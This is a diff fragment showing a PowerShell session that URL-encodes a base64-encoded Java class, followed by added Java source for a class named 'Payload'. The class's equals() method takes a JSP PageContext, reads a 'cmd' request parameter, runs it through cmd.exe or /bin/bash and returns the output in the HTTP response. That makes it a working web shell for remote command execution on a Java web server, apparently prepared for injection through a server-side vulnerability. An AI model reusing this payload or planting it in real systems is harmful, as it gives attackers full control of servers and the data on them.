@@ -158,3 +158,56 @@ PS C:\workspace>
 
 PS C:\workspace> [System.Net.WebUtility]::UrlEncode("yv66vgAAAEEAHQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCQAIAAkHAAoMAAsADAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsIAA4BAAVoZWxsbwoAEAARBwASDAATABQBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgcAFgEAB1BheWxvYWQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQAhABUAAgAAAAAAAgABAAUABgABABcAAAAdAAEAAQAAAAUqtwABsQAAAAEAGAAAAAYAAQAAAAEAAQAZABoAAQAXAAAAJgACAAIAAAAKsgAHEg22AA8ErAAAAAEAGAAAAAoAAgAAAAQACAAFAAEAGwAAAAIAHA==")
 yv66vgAAAEEAHQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ%2BAQADKClWCQAIAAkHAAoMAAsADAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsIAA4BAAVoZWxsbwoAEAARBwASDAATABQBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgcAFgEAB1BheWxvYWQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQAhABUAAgAAAAAAAgABAAUABgABABcAAAAdAAEAAQAAAAUqtwABsQAAAAEAGAAAAAYAAQAAAAEAAQAZABoAAQAXAAAAJgACAAIAAAAKsgAHEg22AA8ErAAAAAEAGAAAAAoAAgAAAAQACAAFAAEAGwAAAAIAHA%3D%3D
+
+
+
+import jakarta.servlet.jsp.PageContext;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Payload {
+    @Override
+    public boolean equals(Object obj) {
+        try {
+            PageContext pc = (PageContext) obj;
+
+            HttpServletRequest request = (HttpServletRequest) pc.getRequest();
+            HttpServletResponse response = (HttpServletResponse) pc.getResponse();
+
+            String cmd = request.getParameter("cmd");
+
+            if (cmd != null) {
+
+                String os = System.getProperty("os.name").toLowerCase();
+
+                Process p;
+
+                if (os.contains("win")) {
+                    p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+                } else {
+                    p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
+                }
+
+                BufferedReader br = new BufferedReader(
+                        new InputStreamReader(p.getInputStream())
+                );
+
+                String line;
+                StringBuilder result = new StringBuilder();
+
+                while ((line = br.readLine()) != null) {
+                    result.append(line).append("\n");
+                }
+
+                response.getWriter().write(result.toString());
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return true;
+    }
+}
